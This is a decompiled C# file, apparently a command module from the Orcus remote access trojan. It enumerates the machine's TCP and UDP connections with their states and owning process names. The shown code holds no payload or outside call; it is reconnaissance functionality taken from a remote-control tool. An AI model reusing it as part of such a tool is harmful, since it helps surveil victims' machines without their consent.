using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using Orcus.Native;
using Orcus.Shared.Commands.ActiveConnections;

namespace Orcus.Commands.ActiveConnections;

internal class Connections
{
	private const int MIB_TCP_STATE_ESTAB = 5;

	private const int MIB_TCP_STATE_TIME_WAIT = 11;

	private const int MIB_TCP_STATE_LISTEN = 2;

	private const int MIB_TCP_STATE_CLOSE_WAIT = 8;

	public static List<ActiveConnection> GetUdpConnections()
	{
		int ipVersion = 2;
		int dwOutBufLen = 0;
		uint extendedUdpTable = NativeMethods.GetExtendedUdpTable(IntPtr.Zero, ref dwOutBufLen, sort: true, 2, UDP_TABLE_CLASS.UDP_TABLE_OWNER_PID, 0);
		if (extendedUdpTable != 0 && extendedUdpTable != 122)
		{
			throw new Exception("bad ret on check " + extendedUdpTable);
		}
		IntPtr intPtr = Marshal.AllocHGlobal(dwOutBufLen);
		MIB_UDPROW_OWNER_PID[] array;
		try
		{
			extendedUdpTable = NativeMethods.GetExtendedUdpTable(intPtr, ref dwOutBufLen, sort: true, ipVersion, UDP_TABLE_CLASS.UDP_TABLE_OWNER_PID, 0);
			if (extendedUdpTable != 0)
			{
				throw new Exception("bad ret " + extendedUdpTable);
			}
			MIB_UDPTABLE_OWNER_PID mIB_UDPTABLE_OWNER_PID = (MIB_UDPTABLE_OWNER_PID)Marshal.PtrToStructure(intPtr, typeof(MIB_UDPTABLE_OWNER_PID));
			IntPtr intPtr2 = (IntPtr)((long)intPtr + Marshal.SizeOf((object)mIB_UDPTABLE_OWNER_PID.dwNumEntries));
			array = new MIB_UDPROW_OWNER_PID[mIB_UDPTABLE_OWNER_PID.dwNumEntries];
			for (int i = 0; i < mIB_UDPTABLE_OWNER_PID.dwNumEntries; i++)
			{
				MIB_UDPROW_OWNER_PID mIB_UDPROW_OWNER_PID = (array[i] = (MIB_UDPROW_OWNER_PID)Marshal.PtrToStructure(intPtr2, typeof(MIB_UDPROW_OWNER_PID)));
				intPtr2 = (IntPtr)((long)intPtr2 + Marshal.SizeOf((object)mIB_UDPROW_OWNER_PID));
			}
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
		return ((IEnumerable<MIB_UDPROW_OWNER_PID>)array).Select((Func<MIB_UDPROW_OWNER_PID, ActiveConnection>)delegate(MIB_UDPROW_OWNER_PID x)
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Unknown result type (might be due to invalid IL or missing references)
			//IL_003b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0061: Expected O, but got Unknown
			ActiveConnection val = new ActiveConnection();
			val.set_ProtocolName((ProtocolName)1);
			val.set_LocalAddress(IntToIp(x.localAddr));
			val.set_LocalPort((int)x.LocalPort);
			val.set_RemoteAddress(IntToIp(x.remoteAddr));
			val.set_RemotePort((int)x.RemotePort);
			val.set_State((ConnectionState)0);
			val.set_ApplicationName(GetProcessTitle(x.owningPid));
			return val;
		}).ToList();
	}

	public static List<ActiveConnection> GetTcpConnections()
	{
		int ipVersion = 2;
		int dwOutBufLen = 0;
		uint extendedTcpTable = NativeMethods.GetExtendedTcpTable(IntPtr.Zero, ref dwOutBufLen, sort: true, 2, TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL, 0);
		if (extendedTcpTable != 0 && extendedTcpTable != 122)
		{
			throw new Exception("bad ret on check " + extendedTcpTable);
		}
		IntPtr intPtr = Marshal.AllocHGlobal(dwOutBufLen);
		MIB_TCPROW_OWNER_PID[] array;
		try
		{
			extendedTcpTable = NativeMethods.GetExtendedTcpTable(intPtr, ref dwOutBufLen, sort: true, ipVersion, TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL, 0);
			if (extendedTcpTable != 0)
			{
				throw new Exception("bad ret " + extendedTcpTable);
			}
			MIB_TCPTABLE_OWNER_PID mIB_TCPTABLE_OWNER_PID = (MIB_TCPTABLE_OWNER_PID)Marshal.PtrToStructure(intPtr, typeof(MIB_TCPTABLE_OWNER_PID));
			IntPtr intPtr2 = (IntPtr)((long)intPtr + Marshal.SizeOf((object)mIB_TCPTABLE_OWNER_PID.dwNumEntries));
			array = new MIB_TCPROW_OWNER_PID[mIB_TCPTABLE_OWNER_PID.dwNumEntries];
			for (int i = 0; i < mIB_TCPTABLE_OWNER_PID.dwNumEntries; i++)
			{
				MIB_TCPROW_OWNER_PID mIB_TCPROW_OWNER_PID = (array[i] = (MIB_TCPROW_OWNER_PID)Marshal.PtrToStructure(intPtr2, typeof(MIB_TCPROW_OWNER_PID)));
				intPtr2 = (IntPtr)((long)intPtr2 + Marshal.SizeOf((object)mIB_TCPROW_OWNER_PID));
			}
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
		return ((IEnumerable<MIB_TCPROW_OWNER_PID>)array).Select((Func<MIB_TCPROW_OWNER_PID, ActiveConnection>)delegate(MIB_TCPROW_OWNER_PID x)
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Unknown result type (might be due to invalid IL or missing references)
			//IL_003b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0059: Unknown result type (might be due to invalid IL or missing references)
			//IL_006b: Expected O, but got Unknown
			ActiveConnection val = new ActiveConnection();
			val.set_ProtocolName((ProtocolName)0);
			val.set_LocalAddress(IntToIp(x.localAddr));
			val.set_LocalPort((int)x.LocalPort);
			val.set_RemoteAddress(IntToIp(x.remoteAddr));
			val.set_RemotePort((int)x.RemotePort);
			val.set_State(ConvertToState(x.state));
			val.set_ApplicationName(GetProcessTitle(x.owningPid));
			return val;
		}).ToList();
	}

	private static string IntToIp(uint raw)
	{
		return new IPAddress(BitConverter.GetBytes(raw)).ToString();
	}

	private static ConnectionState ConvertToState(uint state)
	{
		return (ConnectionState)(state switch
		{
			5u => 1, 
			2u => 2, 
			11u => 3, 
			8u => 4, 
			_ => 5, 
		});
	}

	private static string GetProcessTitle(int id)
	{
		try
		{
			return Process.GetProcessById(id).ProcessName;
		}
		catch (Exception)
		{
			return null;
		}
	}
}
